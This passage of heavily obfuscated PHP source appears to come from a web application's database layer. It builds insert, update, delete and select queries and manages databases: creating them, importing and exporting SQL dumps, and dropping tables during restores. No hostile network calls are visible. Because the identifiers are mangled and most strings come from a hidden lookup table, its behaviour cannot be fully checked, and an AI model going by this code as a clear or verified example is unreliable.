? $this->buildSelectSql($ƒÀƒ…¤) : $ƒÀƒ…¤); } return implode($ù Ã›«²[63], $«Ö‘Å­É); } public function insert($³‚×ùŞÅ, $é¦¨şä = array(), $ØèÒÃıé = false) { $©Æ¤í…¡ =& $_SERVER[¹Û¹Æ€]; $ñ­ıº³­ = $¥ı²¡â = array(); $this->model = $é¦¨şä[$©Æ¤í…¡[290]]; foreach ($³‚×ùŞÅ as $„²¹½Ù => $†ØÒ·ó) { if (is_array($†ØÒ·ó) && $©Æ¤í…¡[306] == $†ØÒ·ó[0]) { $¥ı²¡â[] = $this->parseKey($„²¹½Ù); $ñ­ıº³­[] = $†ØÒ·ó[1]; } elseif (is_scalar($†ØÒ·ó) || is_null($†ØÒ·ó)) { $¥ı²¡â[] = $this->parseKey($„²¹½Ù); $ñ­ıº³­[] = $this->parseValue($†ØÒ·ó); } } $İÔúÎ€ = ($ØèÒÃıé ? $©Æ¤í…¡[904] : $©Æ¤í…¡[905]) . $©Æ¤í…¡[906] . $this->parseTable($é¦¨şä[$©Æ¤í…¡[288]]) . $©Æ¤í…¡[900] . implode($©Æ¤í…¡[60], $¥ı²¡â) . $©Æ¤í…¡[901] . implode($©Æ¤í…¡[60], $ñ­ıº³­) . $©Æ¤í…¡[902]; $İÔúÎ€ .= $this->parseLock(isset($é¦¨şä[$©Æ¤í…¡[841]]) ? $é¦¨şä[$©Æ¤í…¡[841]] : !1); $İÔúÎ€ .= $this->parseComment(!empty($é¦¨şä[$©Æ¤í…¡[363]]) ? $é¦¨şä[$©Æ¤í…¡[363]] : $©Æ¤í…¡[22]); return $this->execute($İÔúÎ€, $this->parseBind(!empty($é¦¨şä[$©Æ¤í…¡[294]]) ? $é¦¨şä[$©Æ¤í…¡[294]] : array())); } public function selectInsert($øğ˜Éàö, $¬ìÌ•±Ò, $·µ¹Å‘ = array()) { $¡ÂÆËÆ» =& $_SERVER[¹Û¹Æ€]; $this->model = $·µ¹Å‘[$¡ÂÆËÆ»[290]]; if (is_string($øğ˜Éàö)) { $øğ˜Éàö = explode($¡ÂÆËÆ»[60], $øğ˜Éàö); } array_walk($øğ˜Éàö, array($this, $¡ÂÆËÆ»[903])); $™‘àôûû = $¡ÂÆËÆ»[1037] . $this->parseTable($¬ìÌ•±Ò) . $¡ÂÆËÆ»[900] . implode($¡ÂÆËÆ»[60], $øğ˜Éàö) . $¡ÂÆËÆ»[1015]; $™‘àôûû .= $this->buildSelectSql($·µ¹Å‘); return $this->execute($™‘àôûû, $this->parseBind(!empty($·µ¹Å‘[$¡ÂÆËÆ»[294]]) ? $·µ¹Å‘[$¡ÂÆËÆ»[294]] : array())); } public function update($ñ®öÙ„à, $²Ù“‘éÉ) { $ „±íïü =& $_SERVER[¹Û¹Æ€]; $this->model = $²Ù“‘éÉ[$ „±íïü[290]]; $Ş¢¹ı·Ü = $ „±íïü[1038] . $this->parseTable($²Ù“‘éÉ[$ „±íïü[288]]) . $this->parseSet($ñ®öÙ„à) . $this->parseWhere(!empty($²Ù“‘éÉ[$ „±íïü[284]]) ? $²Ù“‘éÉ[$ „±íïü[284]] : $ „±íïü[22]) . $this->parseOrder(!empty($²Ù“‘éÉ[$ „±íïü[374]]) ? $²Ù“‘éÉ[$ „±íïü[374]] : $ „±íïü[22]) . $this->parseLimit(!empty($²Ù“‘éÉ[$ „±íïü[301]]) ? $²Ù“‘éÉ[$ „±íïü[301]] : $ „±íïü[22]) . $this->parseLock(isset($²Ù“‘éÉ[$ „±íïü[841]]) ? $²Ù“‘éÉ[$ „±íïü[841]] : !1) . $this->parseComment(!empty($²Ù“‘éÉ[$ „±íïü[363]]) ? $²Ù“‘éÉ[$ „±íïü[363]] : $ „±íïü[22]); return $this->execute($Ş¢¹ı·Ü, $this->parseBind(!empty($²Ù“‘éÉ[$ „±íïü[294]]) ? $²Ù“‘éÉ[$ „±íïü[294]] : array())); } public function delete($È£”‹ä­ = array()) { $Íãçµ˜Ê =& $_SERVER[¹Û¹Æ€]; $this->model = $È£”‹ä­[$Íãçµ˜Ê[290]]; $«´÷­Š = $Íãçµ˜Ê[1039] . $this->parseTable($È£”‹ä­[$Íãçµ˜Ê[288]]) . $this->parseWhere(!empty($È£”‹ä­[$Íãçµ˜Ê[284]]) ? $È£”‹ä­[$Íãçµ˜Ê[284]] : $Íãçµ˜Ê[22]) . $this->parseOrder(!empty($È£”‹ä­[$Íãçµ˜Ê[374]]) ? $È£”‹ä­[$Íãçµ˜Ê[374]] : $Íãçµ˜Ê[22]) . $this->parseLimit(!empty($È£”‹ä­[$Íãçµ˜Ê[301]]) ? $È£”‹ä­[$Íãçµ˜Ê[301]] : $Íãçµ˜Ê[22]) . $this->parseLock(isset($È£”‹ä­[$Íãçµ˜Ê[841]]) ? $È£”‹ä­[$Íãçµ˜Ê[841]] : !1) . $this->parseComment(!empty($È£”‹ä­[$Íãçµ˜Ê[363]]) ? $È£”‹ä­[$Íãçµ˜Ê[363]] : $Íãçµ˜Ê[22]); return $this->execute($«´÷­Š, $this->parseBind(!empty($È£”‹ä­[$Íãçµ˜Ê[294]]) ? $È£”‹ä­[$Íãçµ˜Ê[294]] : array())); } public function select($ë´‹Õ€ = array()) { $¿Ê‚É¥Ä =& $_SERVER[¹Û¹Æ€]; $this->model = $ë´‹Õ€[$¿Ê‚É¥Ä[290]]; $àƒÆ××Å = $this->buildSelectSql($ë´‹Õ€); $‰Ûİ¶ã = isset($ë´‹Õ€[$¿Ê‚É¥Ä[358]]) ? $ë´‹Õ€[$¿Ê‚É¥Ä[358]] : !1; if ($‰Ûİ¶ã) { $ùö³•„Æ = is_string($‰Ûİ¶ã[$¿Ê‚É¥Ä[104]]) ? $‰Ûİ¶ã[$¿Ê‚É¥Ä[104]] : $¿Ê‚É¥Ä[1040] . md5($àƒÆ××Å); $À‹ÖØ„€ = think_cache($ùö³•„Æ, $¿Ê‚É¥Ä[22], $‰Ûİ¶ã); if (!1 !== $À‹ÖØ„€) { return $À‹ÖØ„€; } } $’ÍÑ¡Î = $this->query($àƒÆ××Å, $this->parseBind(!empty($ë´‹Õ€[$¿Ê‚É¥Ä[294]]) ? $ë´‹Õ€[$¿Ê‚É¥Ä[294]] : array())); if ($‰Ûİ¶ã && !1 !== $’ÍÑ¡Î) { think_cache($ùö³•„Æ, $’ÍÑ¡Î, $‰Ûİ¶ã); } return $’ÍÑ¡Î; } public function buildSelectSql($ç¸ºÖù– = array()) { $°ÇšÚâ =& $_SERVER[¹Û¹Æ€]; if (isset($ç¸ºÖù–[$°ÇšÚâ[362]])) { if (strpos($ç¸ºÖù–[$°ÇšÚâ[362]], $°ÇšÚâ[60])) { list($‚˜ü¯É…, $¨ñ­ş§õ) = explode($°ÇšÚâ[60], $ç¸ºÖù–[$°ÇšÚâ[362]]); } else { $‚˜ü¯É… = $ç¸ºÖù–[$°ÇšÚâ[362]]; } $‚˜ü¯É… = $‚˜ü¯É… ? $‚˜ü¯É… : 1; $¨ñ­ş§õ = isset($¨ñ­ş§õ) ? $¨ñ­ş§õ : (is_numeric($ç¸ºÖù–[$°ÇšÚâ[301]]) ? $ç¸ºÖù–[$°ÇšÚâ[301]] : 20); $ìŞ‹ó– = $¨ñ­ş§õ * ((int) $‚˜ü¯É… - 1); $ç¸ºÖù–[$°ÇšÚâ[301]] = $ìŞ‹ó– . $°ÇšÚâ[60] . $¨ñ­ş§õ; } if (think_config($°ÇšÚâ[1041])) { $Ïşšë³» = $°ÇšÚâ[1042] . md5(serialize($ç¸ºÖù–)); $ÀÑ‚€“ƒ = think_cache($Ïşšë³»); if ($ÀÑ‚€“ƒ) { return $ÀÑ‚€“ƒ; } } $ù‚•²‘ = $this->parseSql($this->selectSql, $ç¸ºÖù–); $ù‚•²‘ .= $this->parseLock(isset($ç¸ºÖù–[$°ÇšÚâ[841]]) ? $ç¸ºÖù–[$°ÇšÚâ[841]] : !1); if (isset($Ïşšë³»)) { think_cache($Ïşšë³», $ù‚•²‘); } return $ù‚•²‘; } public function parseSql($–ñÚæÒó, $•ƒî¾ÆŠ = array()) { $ĞËœÄîÌ =& $_SERVER[¹Û¹Æ€]; $–ñÚæÒó = str_replace(array($ĞËœÄîÌ[1043], $ĞËœÄîÌ[1044], $ĞËœÄîÌ[1045], $ĞËœÄîÌ[1046], $ĞËœÄîÌ[1047], $ĞËœÄîÌ[1048], $ĞËœÄîÌ[1049], $ĞËœÄîÌ[1050], $ĞËœÄîÌ[1051], $ĞËœÄîÌ[1052], $ĞËœÄîÌ[1053]), array($this->parseTable("{$•ƒî¾ÆŠ[$ĞËœÄîÌ[288]]}"), $this->parseDistinct(isset($•ƒî¾ÆŠ[$ĞËœÄîÌ[1054]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[1054]] : !1), $this->parseField(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[282]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[282]] : $ĞËœÄîÌ[198]), $this->parseJoin(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[291]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[291]] : $ĞËœÄîÌ[22]), $this->parseWhere(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[284]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[284]] : $ĞËœÄîÌ[22]), $this->parseGroup(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[524]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[524]] : $ĞËœÄîÌ[22]), $this->parseHaving(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[1055]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[1055]] : $ĞËœÄîÌ[22]), $this->parseOrder(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[374]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[374]] : $ĞËœÄîÌ[22]), $this->parseLimit(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[301]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[301]] : $ĞËœÄîÌ[22]), $this->parseUnion(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[356]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[356]] : $ĞËœÄîÌ[22]), $this->parseComment(!empty($•ƒî¾ÆŠ[$ĞËœÄîÌ[363]]) ? $•ƒî¾ÆŠ[$ĞËœÄîÌ[363]] : $ĞËœÄîÌ[22])), $–ñÚæÒó); return $–ñÚæÒó; } public function getLastSql($´Ö›óªö = '') { return $´Ö›óªö ? $this->modelSql[$´Ö›óªö] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($®Òçï¿Î) { return addslashes($®Òçï¿Î); } public function setModel($¡Ç¦É“) { $this->model = $¡Ç¦É“; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($„Í¶Ú¢€ = array()) { $Ä¿Ëä·á =& $_SERVER[¹Û¹Æ€]; if (empty($„Í¶Ú¢€)) { $„Í¶Ú¢€ = $GLOBALS[$Ä¿Ëä·á[16]][$Ä¿Ëä·á[31]]; } $this->database = $„Í¶Ú¢€; } public function model($‰®º¬¼ = '') { return new ModelBase($‰®º¬¼, $_SERVER[¹Û¹Æ€][22], $this->database); } public function db($æëë© „ = false) { $Ê´“ˆ›È =& $_SERVER[¹Û¹Æ€]; $ıŸŠà‚ü = array_change_key_case($this->database); if ($this->dbType() == $Ê´“ˆ›È[23] || !$æëë© „) { return $this->model()->db(); } $‘éîøÕŒ = $ıŸŠà‚ü[$Ê´“ˆ›È[969]]; $ıŸŠà‚ü[$Ê´“ˆ›È[969]] = $Ê´“ˆ›È[22]; if ($ıŸŠà‚ü[$Ê´“ˆ›È[964]] == $Ê´“ˆ›È[961]) { $½È¾ô–  = $ıŸŠà‚ü[$Ê´“ˆ›È[970]]; $ıŸŠà‚ü[$Ê´“ˆ›È[970]] = substr($½È¾ô– , 0, strrpos($½È¾ô– , $Ê´“ˆ›È[1056])); } $this->database = $ıŸŠà‚ü; $ïÍÒï = $this->model()->db(); try { $ûÙì¤¿ö = $ïÍÒï->execute("\x73\x68\x6f\167\x20\144\141\x74\141\142\x61\x73\145\163\40\154\x69\153\145\40\47{$‘éîøÕŒ}\x27"); } catch (Exception $Äˆ£ÅÇ„) { } if (!$ûÙì¤¿ö) { $ïÍÒï->execute("\143\162\145\x61\164\145\x20\144\x61\x74\x61\142\141\x73\145\x20\x60{$‘éîøÕŒ}\x60"); } $ıŸŠà‚ü[$Ê´“ˆ›È[969]] = $‘éîøÕŒ; if ($ıŸŠà‚ü[$Ê´“ˆ›È[964]] == $Ê´“ˆ›È[961]) { $ıŸŠà‚ü[$Ê´“ˆ›È[970]] .= $Ê´“ˆ›È[1056] . $‘éîøÕŒ; } $this->database = $ıŸŠà‚ü; $ïÍÒï->execute("\x75\x73\x65\x20\x60{$‘éîøÕŒ}\x60"); return $ïÍÒï; } public function createTable($Îëú÷Ş», &$›˜äº‰) { $Íñ‹µæ³ =& $_SERVER[¹Û¹Æ€]; if (!IO::exist($Îëú÷Ş»)) { ActionCall($Íñ‹µæ³[1057], !0, 0); show_json(LNG($Íñ‹µæ³[1058]), !1); } $ê€Ä‹İŠ = $this->model()->db(); $‰÷óíğØ = sqlSplit(IO::getContent($Îëú÷Ş»)); foreach ($‰÷óíğØ as $ÒİÈğ¸ô) { $´¹çÅÛÉ = stripos($ÒİÈğ¸ô, $Íñ‹µæ³[1059]) === 0; if ($´¹çÅÛÉ) { $›˜äº‰->task[$Íñ‹µæ³[784]] += 1; } $ê€Ä‹İŠ->execute($ÒİÈğ¸ô); if ($´¹çÅÛÉ) { preg_match($Íñ‹µæ³[1060], $ÒİÈğ¸ô, $íçÛÁ·…); $›˜äº‰->task[$Íñ‹µæ³[1061]] = $íçÛÁ·…[1]; $›˜äº‰->update(1); } } } public function insertTable($˜ÎÛœ®Ô, &$Û¾ùäé¢) { $À»ç©Õè =& $_SERVER[¹Û¹Æ€]; $‹ú»Òš = $this->model()->db(); $»Ÿ½ÔîÜ = $÷³¹‹ × ? array($÷³¹‹ ×) : $‹ú»Òš->getTables(); foreach ($˜ÎÛœ®Ô as $³÷–ğ) { $÷³¹‹ × = basename($³÷–ğ, $À»ç©Õè[786]); if (!in_array($÷³¹‹ ×, $»Ÿ½ÔîÜ)) { continue; } $Û¾ùäé¢->task[$À»ç©Õè[1061]] = $÷³¹‹ ×; if (get_filesize($³÷–ğ) == 0) { continue; } $î³¾ø­Ò = $this->sqlToDb($³÷–ğ, $Û¾ùäé¢); if (!$î³¾ø­Ò) { ActionCall($À»ç©Õè[1057], !0, 0); show_json(LNG($À»ç©Õè[1062]) . "\x5b{$÷³¹‹ ×}\x5d", !1); } } } public function sqlFromDb($Éû½úâ£, $ìÎÃÛÑ, &$·‚ –, $«âÀŞè´ = '') { if ($·‚ –) { $·‚ –->task[$_SERVER[¹Û¹Æ€][1061]] = $Éû½úâ£; } $Û©‚©ä = $this->model($Éû½úâ£); $Ë›—óÑ© = 0; $Í©À†èÉ = 0; $Â¥œìşÖ = 10000; $Ö£öô‡ = fopen($ìÎÃÛÑ, $_SERVER[¹Û¹Æ€][1063]); $ììÑ¸¦Ü = $Û©‚©ä->getPk(); $ŒÙ³—¶÷ = $Û©‚©ä->getDbFields(); $öØá¹Ã = $_SERVER[¹Û¹Æ€][22]; if ($GLOBALS[$_SERVER[¹Û¹Æ€][785]] && in_array($Éû½úâ£, array($_SERVER[¹Û¹Æ€][1064], $_SERVER[¹Û¹Æ€][1065]))) { $öØá¹Ã = $Éû½úâ£; } do { $èàš ®ì = array($ììÑ¸¦Ü => array($_SERVER[¹Û¹Æ€][1011], $Í©À†èÉ)); $ü¼îâŠú = $Û©‚©ä->where($èàš ®ì)->field($ŒÙ³—¶÷)->order($ììÑ¸¦Ü . $_SERVER[¹Û¹Æ€][1066])->limit($Â¥œìşÖ)->select(); $ü¼îâŠú = !empty($ü¼îâŠú) ? $ü¼îâŠú : array(); if (!($š—à¦î‘ = count($ü¼îâŠú))) { break; } $à÷¹Ò¹ = end($ü¼îâŠú); $Í©À†èÉ = $à÷¹Ò¹[$ììÑ¸¦Ü]; $²ûïó½ = array(); foreach ($ü¼îâŠú as $åÒ˜íãò) { if ($öØá¹Ã) { if ($Éû½úâ£ == $_SERVER[¹Û¹Æ€][1064]) { if ($åÒ˜íãò[$_SERVER[¹Û¹Æ€][43]] == $_SERVER[¹Û¹Æ€][1067]) { $·‹¨‚Ş® = json_decode($åÒ˜íãò[$_SERVER[¹Û¹Æ€][383]], !0); if ($·‹¨‚Ş®[$_SERVER[¹Û¹Æ€][42]] == $GLOBALS[$_SERVER[¹Û¹Æ€][785]] && $·‹¨‚Ş®[$_SERVER[¹Û¹Æ€][748]] != 1) { continue; } } } else { if ($åÒ˜íãò[$_SERVER[¹Û¹Æ€][43]] == $_SERVER[¹Û¹Æ€][1068] && $åÒ˜íãò[$_SERVER[¹Û¹Æ€][104]] == $_SERVER[¹Û¹Æ€][777]) { continue; } } } if ($«âÀŞè´) { $åÒ˜íãò[$_SERVER[¹Û¹Æ€][94]] = "\173\x69\157\x3a{$«âÀŞè´}\175" . substr($åÒ˜íãò[$_SERVER[¹Û¹Æ€][94]], strlen("\173\151\157\72{$åÒ˜íãò[$_SERVER[¹Û¹Æ€][815]]}\x7d")); $åÒ˜íãò[$_SERVER[¹Û¹Æ€][815]] = $«âÀŞè´; } $²ûïó½[] = $_SERVER[¹Û¹Æ€][1069] . $this->sqlEncode($åÒ˜íãò) . $_SERVER[¹Û¹Æ€][1070]; } $¿€Ğ­©¯ = "\111\x4e\123\x45\122\124\x20\x49\116\x54\117\40\x60{$Éû½úâ£}\x60\x20\50\140" . implode($_SERVER[¹Û¹Æ€][1071], $ŒÙ³—¶÷) . $_SERVER[¹Û¹Æ€][1072]; fwrite($Ö£öô‡, $¿€Ğ­©¯ . implode($_SERVER[¹Û¹Æ€][1073], $²ûïó½) . $_SERVER[¹Û¹Æ€][81] . PHP_EOL); $Ë›—óÑ© += $š—à¦î‘; if ($·‚ –) { $·‚ –->update($š—à¦î‘); } } while ($Â¥œìşÖ == $š—à¦î‘); fclose($Ö£öô‡); return $Ë›—óÑ©; } public function sqlToDb($™âôÍ¥…, &$£”ú›ï) { $ïÛ´Ñê³ =& $_SERVER[¹Û¹Æ€]; $î«“˜ÙÙ = $this->model()->db(); $ÄÂ‹° = @fopen($™âôÍ¥…, $ïÛ´Ñê³[1074]); if (!$ÄÂ‹°) { return !1; } $ÇÌç•Ì˜ = 0; $Üò¿Ö…× = $ïÛ´Ñê³[22]; $ş«Ç¨¼¹ = array(); $¶µÑ·œ = $this->dbType(); $–¼¾”Ğ‰ = $¶µÑ·œ == $ïÛ´Ñê³[23] ? 500 : 2000; $ºã·©¥Ê = basename($™âôÍ¥…, $ïÛ´Ñê³[786]); $ş™Èû = 0; $¢†¶ãö  = 4194304 - 104858; $¬—¤¢ = 1000000 - 104858; while (!feof($ÄÂ‹°)) { $¹ÚÖ³¢ = trim(fgets($ÄÂ‹°)); if (!$¹ÚÖ³¢) { continue; } $Œ•£åÂ = $this->sqlDecode($¹ÚÖ³¢, $¶µÑ·œ, $ºã·©¥Ê); if (stripos($Œ•£åÂ, $ïÛ´Ñê³[364]) === 0) { if (!$Üò¿Ö…×) { $Üò¿Ö…× = $Œ•£åÂ . $ïÛ´Ñê³[63]; } continue; } if ($£”ú›ï) { $£”ú›ï->task[$ïÛ´Ñê³[784]] += 1; } $ÇÌç•Ì˜++; $ş«Ç¨¼¹[] = rtrim(rtrim(trim($Œ•£åÂ), $ïÛ´Ñê³[60]), $ïÛ´Ñê³[81]); $İ”€‘üÈ = null; $é››Ñ÷ù = strlen($Œ•£åÂ); $ş™Èû += $é››Ñ÷ù; if ($ş™Èû >= ($–¼¾”Ğ‰ == 500 ? $¬—¤¢ : $¢†¶ãö )) { $İ”€‘üÈ = array_pop($ş«Ç¨¼¹); if ($ÇÌç•Ì˜ > 1) { $ÇÌç•Ì˜--; } } if ($ÇÌç•Ì˜ >= $–¼¾”Ğ‰ || $İ”€‘üÈ) { $Œ•£åÂ = $Üò¿Ö…× . implode($ïÛ´Ñê³[60], $ş«Ç¨¼¹); if (!$î«“˜ÙÙ->execute($Œ•£åÂ)) { return !1; } if ($£”ú›ï) { $£”ú›ï->update($ÇÌç•Ì˜); } $ş«Ç¨¼¹ = array(); $ÇÌç•Ì˜ = 0; $ş™Èû = 0; if ($İ”€‘üÈ) { $ş«Ç¨¼¹ = array($İ”€‘üÈ); $ÇÌç•Ì˜ = 1; $ş™Èû = $é››Ñ÷ù; } } } fclose($ÄÂ‹°); if (!empty($ş«Ç¨¼¹)) { $Œ•£åÂ = $Üò¿Ö…× . implode($ïÛ´Ñê³[60], $ş«Ç¨¼¹); if (!$î«“˜ÙÙ->execute($Œ•£åÂ)) { return !1; } if ($£”ú›ï) { $£”ú›ï->update($ÇÌç•Ì˜); } } return !0; } public function dropTable($…ıàûƒş = null) { $ÁÇÕâ©ı = $this->model()->db(); $ç…¶ôşÀ = $…ıàûƒş ? array($…ıàûƒş) : $ÁÇÕâ©ı->getTables(); if (!$ç…¶ôşÀ) { return; } foreach ($ç…¶ôşÀ as $…ıàûƒş) { if ($…ıàûƒş) { $…ıàûƒş = strtolower($…ıàûƒş); } else { continue; } $ÁÇÕâ©ı->execute("\x64\162\157\x70\x20\164\x61\x62\x6c\145\x20\151\146\40\x65\x78\x69\x73\164\163\40\140{$…ıàûƒş}\x60"); } } private function sqlEncode($õ²¬ĞÑÌ) { $ÕÖ“ªÀâ =& $_SERVER[¹Û¹Æ€]; $Œ¯šéÛ† = array(); foreach ($õ²¬ĞÑÌ as $ñÅ’‚) { if (is_array($ñÅ’‚)) { $ñÅ’‚ = json_encode_force($ñÅ’‚); } $ñÅ’‚ = addslashes($ñÅ’‚); $ñÅ’‚ = str_replace(array($ÕÖ“ªÀâ[1075], $ÕÖ“ªÀâ[12]), array($ÕÖ“ªÀâ[1076], $ÕÖ“ªÀâ[1077]), $ñÅ’‚); $Œ¯šéÛ†[] = str_replace($ÕÖ“ªÀâ[68], $ÕÖ“ªÀâ[1078], $ñÅ’‚); } return $ÕÖ“ªÀâ[68] . implode($ÕÖ“ªÀâ[1079], $Œ¯šéÛ†) . $ÕÖ“ªÀâ[68]; } private function sqlDecode($éØ†•ÉÄ, $Êü¦³íà, $¨Éâ†å = '') { $ØÒ‘ç¡ =& $_SERVER[¹Û¹Æ€]; $éØ†•ÉÄ = str_replace(array($ØÒ‘ç¡[1076], $ØÒ‘ç¡[1077]), array($ØÒ‘ç¡[1075], $ØÒ‘ç¡[12]), $éØ†•ÉÄ); if ($Êü¦³íà == $ØÒ‘ç¡[23]) { return $¨Éâ†å != $ØÒ‘ç¡[1080] ? stripslashes($éØ†•ÉÄ) : $éØ†•ÉÄ; } if ($¨Éâ†å == $ØÒ‘ç¡[1080]) { $éØ†•ÉÄ = str_replace($ØÒ‘ç¡[1081], $ØÒ‘ç¡[128], stripslashes($éØ†•ÉÄ)); } return $éØ†•ÉÄ; } public function getSqlFile($¶÷È³ÍŒ = '') { $…Îş«ô =& $_SERVER[¹Û¹Æ€]; $ÁÛ°¡÷ß = $this->dbType(!0); $²ÏÀóí¤ = CONTROLLER_DIR . "\x69\156\x73\x74\141\x6c\x6c\57\x64\141\x74\x61\x2f{$ÁÛ°¡÷ß}\x2e\163\x71\x6c"; $–º¸¤„¢ = file_get_contents($²ÏÀóí¤); $°ÄÌÏ³ = $…Îş«ô[1082] . ($ÁÛ°¡÷ß == $…Îş«ô[802] ? $…Îş«ô[1083] : $…Îş«ô[1084]) . $…Îş«ô[1085]; preg_match_all($°ÄÌÏ³, $–º¸¤„¢, $Ï”ïÏ­); $Ò¬ÛˆÌÓ = $Ï”ïÏ­[1]; $£¾ƒÑôš = $this->model()->db(); $®ÏÈÛß = $£¾ƒÑôš->getTables(); $àÎãêîÇ = TEMP_FILES . $…Îş«ô[1086] . date($…Îş«ô[749]) . $…Îş«ô[18]; del_dir($àÎãêîÇ); mk_dir($àÎãêîÇ); $ËÔâº›ø = $àÎãêîÇ . $…Îş«ô[1087]; $¯Óôñä = $àÎãêîÇ . $…Îş«ô[1088]; $ı·Ä’…è = $ÁÛ°¡÷ß == $…Îş«ô[23] ? $…Îş«ô[802] : $…Îş«ô[23]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\141\x6c\x6c\x2f\144\141\164\141\x2f{$ı·Ä’…è}\x2e\163\161\154", $àÎãêîÇ); @touch($àÎãêîÇ . $ÁÛ°¡÷ß . $…Îş«ô[786]); $ÚÒÙ¶ê² = fopen($ËÔâº›ø, $…Îş«ô[1063]); $§ëÁ­è = fopen($¯Óôñä, $…Îş«ô[1063]); if ($ÁÛ°¡÷ß == $…Îş«ô[23]) { $®ÏÈÛß = array_diff($®ÏÈÛß, array($…Îş«ô[782], $…Îş«ô[783])); $ÖÁòÅ• = array($…Îş«ô[1089], $…Îş«ô[1090], $…Îş«ô[1091]); fwrite($§ëÁ­è, implode(PHP_EOL, $ÖÁòÅ•) . PHP_EOL . PHP_EOL); foreach ($®ÏÈÛß as $çÑ•ÙÊÓ) { $¼¢ôÁó = $this->sqlFromSqlite($çÑ•ÙÊÓ); if (!$¼¢ôÁó[$…Îş«ô[23]]) { continue; } fwrite($§ëÁ­è, $¼¢ôÁó[$…Îş«ô[23]] . PHP_EOL . PHP_EOL); if (!in_array($çÑ•ÙÊÓ, $Ò¬ÛˆÌÓ)) { fwrite($ÚÒÙ¶ê², $¼¢ôÁó[$…Îş«ô[802]] . PHP_EOL . PHP_EOL); } } } else { foreach ($®ÏÈÛß as $çÑ•ÙÊÓ) { $¼¢ôÁó = $this->sqlFromMysql($çÑ•ÙÊÓ); if (!$¼¢ôÁó[$…Îş«ô[802]]) { continue; } fwrite($ÚÒÙ¶ê², $¼¢ôÁó[$…Îş«ô[802]] . PHP_EOL . PHP_EOL); if (!in_array($çÑ•ÙÊÓ, $Ò¬ÛˆÌÓ)) { fwrite($§ëÁ­è, $¼¢ôÁó[$…Îş«ô[23]] . PHP_EOL . PHP_EOL); } } } fclose($ÚÒÙ¶ê²); fclose($§ëÁ­è); $–º¸¤„¢ = array($…Îş«ô[802] => $ËÔâº›ø, $…Îş«ô[23] => $¯Óôñä); return $¶÷È³ÍŒ ? $–º¸¤„¢[$¶÷È³ÍŒ] : $–º¸¤„¢; } public function dbType($ÌÜ±üÔ = false) { $ÜÀ¬å¯£ =& $_SERVER[¹Û¹Æ€]; $õÚ„ùÁó = $ÌÜ±üÔ ? $GLOBALS[$ÜÀ¬å¯£[16]][$ÜÀ¬å¯£[31]] : $this->database; $õÚ„ùÁó = array_change_key_case($õÚ„ùÁó); $¹–òûàö = $õÚ„ùÁó[$ÜÀ¬å¯£[964]]; if ($¹–òûàö == $ÜÀ¬å¯£[961]) { $™»Ñ¯ ‰ = explode($ÜÀ¬å¯£[4], $õÚ„ùÁó[$ÜÀ¬å¯£[970]]); $¹–òûàö = $™»Ñ¯ ‰[0]; } $êÑˆÎƒ« = array($ÜÀ¬å¯£[1092] => $ÜÀ¬å¯£[23], $ÜÀ¬å¯£[909] => $ÜÀ¬å¯£[802]); if (isset($êÑˆÎƒ«[$¹–òûàö])) { $¹–òûàö = $êÑˆÎƒ«[$¹–òûàö]; } return $¹–òûàö; } public function sqlFromMysql($”İ§ªĞº, $Ÿß¦òŸ¡ = '') { $ŠĞŸ«ØÑ =& $_SERVER[¹Û¹Æ€]; $„”¼€á = $this->model()->db(); $Áış–ŠÄ = $„”¼€á->query($ŠĞŸ«ØÑ[1093] . $”İ§ªĞº . $ŠĞŸ«ØÑ[394]); if (!$Áış–ŠÄ || !$Áış–ŠÄ[0]) { return !1; } $ù™´îßÜ = _get($Áış–ŠÄ[0], $ŠĞŸ«ØÑ[1094], $ŠĞŸ«ØÑ[22]); if (!$ù™´îßÜ) { return !1; } $—’¨à¤ = "\x44\x52\x4f\120\x20\124\101\x42\114\x45\x20\x49\x46\40\105\130\111\x53\x54\x53\40\x60{$”İ§ªĞº}\x60\73" . PHP_EOL . $ù™´îßÜ . $ŠĞŸ«ØÑ[81]; if ($Ÿß¦òŸ¡ && $Ÿß¦òŸ¡ == $ŠĞŸ«ØÑ[802]) { return $—’¨à¤; } $Û«””¸· = array_change_key_case($GLOBALS[$ŠĞŸ«ØÑ[16]][$ŠĞŸ«ØÑ[31]]); $©ÃÖêä = $Û«””¸·[$ŠĞŸ«ØÑ[969]]; $…¶¤”«Ñ = $ŠĞŸ«ØÑ[1095] . $©ÃÖêä . $ŠĞŸ«ØÑ[1096] . $”İ§ªĞº . $ŠĞŸ«ØÑ[68]; $òÙÜòş“ = $ŠĞŸ«ØÑ[1097] . $”İ§ªĞº . $ŠĞŸ«ØÑ[897]; $ï†»©èÏ = $„”¼€á->query($…¶¤”«Ñ); if (empty($ï†»©èÏ)) { $áüíŞŞÃ = array($ŠĞŸ«ØÑ[802] => $ŠĞŸ«ØÑ[22], $ŠĞŸ«ØÑ[23] => $ŠĞŸ«ØÑ[22]); return $Ÿß¦òŸ¡ ? $áüíŞŞÃ[$Ÿß¦òŸ¡] : $áüíŞŞÃ; } $¨ÔÆòÓ± = $„”¼€á->query($òÙÜòş“); $ÏÀŸˆ™† = $ŠĞŸ«ØÑ[22]; $¦¥˜ŞĞ« = array(); foreach ($¨ÔÆòÓ± as $ÃßÉĞùí) { if (!$ÏÀŸˆ™† && $ÃßÉĞùí[$ŠĞŸ«ØÑ[1098]] == $ŠĞŸ«ØÑ[1099]) { $ÏÀŸˆ™† = 